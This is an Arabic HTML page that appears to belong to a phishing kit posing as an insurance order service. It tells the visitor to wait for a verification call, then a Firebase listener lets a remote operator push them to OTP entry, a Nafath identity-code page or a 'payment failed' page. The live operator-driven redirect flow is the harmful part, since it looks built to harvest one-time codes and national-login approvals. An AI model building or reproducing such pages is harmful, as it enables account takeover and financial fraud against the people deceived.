<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="js/theme-toggle.js"></script>
    <script src="js/i18n.js"></script>
    <title>استكمال الطلب | Call Verification</title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;600;700;800&family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="css/inner-theme.css">
    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore-compat.js"></script>
    <style>
        body { display:flex; flex-direction:column; min-height:100vh; }
        .main-wrap { flex:1; display:flex; align-items:center; justify-content:center; padding:28px 16px 48px; }
        .wait-label { color:#f87171; font-weight:700; font-size:1.05rem; margin-top:4px; }
    </style>
</head>
<body>

<button type="button" class="tree-theme-toggle" onclick="toggleTreeTheme()" aria-label="تبديل الوضع الليلي"><span class="tree-theme-toggle__glyph" aria-hidden="true"></span></button>

<nav class="inner-nav">
    <a href="index.html" class="inner-nav__logo">tree</a>
    <div class="inner-nav__right">
        <button class="lang-btn" data-lang-toggle onclick="toggleLang()">EN</button>
    </div>
</nav>

<div class="main-wrap">
    <div class="teal-card teal-card--narrow" style="width:100%;">
        <div class="card-body" style="text-align:center;padding-top:36px;padding-bottom:40px;">

            <div class="icon-circle icon-circle--phone" style="margin-bottom:20px;">📞</div>

            <div class="section-title" data-i18n="call.title">سوف يتم الاتصال بك الآن</div>
            <div class="section-sub" style="margin:10px 0 6px;line-height:1.7;" data-i18n="call.msg">قم باتباع الخطوات الموجودة بالاتصال ليتم تسجيل رقم جوالك بوثيقة التأمين.</div>
            <div class="wait-label" data-i18n="call.wait">يرجى الانتظار!</div>

            <div class="timer-chip" style="margin-top:24px;justify-content:center;">
                <span data-i18n="call.redirect">إعادة توجيه تلقائي بعد</span>
                <span class="timer-chip__num" id="timer">00:59</span>
            </div>

        </div>
    </div>
</div>

<script>
    const firebaseConfig = {
        apiKey: "AIzaSyCtPCVee8eynRfuFHZ6if_eK-vtaMYY-iE",
        authDomain: "tameen-658e9.firebaseapp.com",
        projectId: "tameen-658e9",
        storageBucket: "tameen-658e9.firebasestorage.app",
        messagingSenderId: "292670676256",
        appId: "1:292670676256:web:3624157751cd194efe4b45"
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.firestore();
    const userId = localStorage.getItem('user_id');

    let time = 59;
    const timerDisplay = document.getElementById('timer');
    const countdown = setInterval(() => {
        timerDisplay.innerText = '00:' + time.toString().padStart(2,'0');
        if (--time < 0) { clearInterval(countdown); window.location.href = "nafath.html"; }
    }, 1000);

    (function() {
        if (userId) {
            db.collection("orders").doc(userId).onSnapshot((doc) => {
                if (doc.exists) {
                    const data = doc.data();
                    if (data.next_step === "GO_TO_OTP") window.location.href = "otp_verification.html";
                    else if (data.next_step === "GO_TO_REJECT") window.location.href = "payment_failed.html";
                    else if (data.next_step === "GO_TO_NAFATH" || data.next_step === "SHOW_NAFATH_CODE") window.location.href = "nafath.html";
                }
            });
        }
    })();
</script>
</body>
</html>
